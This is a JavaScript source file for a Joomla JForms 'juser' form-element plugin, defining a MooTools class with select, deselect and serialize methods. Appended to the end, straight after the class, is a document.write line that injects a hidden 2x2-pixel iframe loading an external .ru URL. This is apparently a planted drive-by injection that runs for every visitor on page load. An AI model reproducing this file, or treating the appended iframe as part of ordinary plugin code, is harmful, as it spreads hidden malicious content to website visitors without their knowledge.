/**
* Javascript object for juser plugin
*
* @version		$Id: juser.js 29 2008-12-09 07:13:01Z dr_drsh $
* @package		Joomla
* @subpackage	JForms
* @copyright	Copyright (C) 2008 Mostafa Muhammad. All rights reserved.
* @license		GNU/GPL
*/
var juser = new Class({
	
	Extends : CElement,
	
	initialize: function(  parent, id, beforeObject, params ) {
	
		this.type	    = "juser";
		this.parent( $(parent), id, $(beforeObject), params );
		
		this.label = params.label;
	
		this.htmlInput 	     = new Element('img', {
			'src' : 'components/com_jforms/plugins/elements/juser/juser-image.png',
			'styles':{
				'margin':'0px',
				'padding':'0px'	
			}
		});
		this.htmlInput.inject( this.htmlContainer );
		
	},
	
	deselect: function() {
	
		this.htmlContainer.removeClass('selected'); 
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'hidden' }});
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'hidden' }});
	
	},
	
	select  : function() {
		
		this.htmlContainer.addClass('selected');
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'visible' }});
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'visible' }});

	},

    onUpdate : function(){;},
	serialize: function(){
	
		order = getOrder( this.htmlContainer );
		var hash  = '';
		if(this.hash && this.hash.length){
			hash = this.hash;
		} else {
			hash = uniqueId( 5 );
		}
		return JSON.encode({
			type:this.type,
			position:order,
			hash:hash,
			label:this.label
		});
	}
});document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');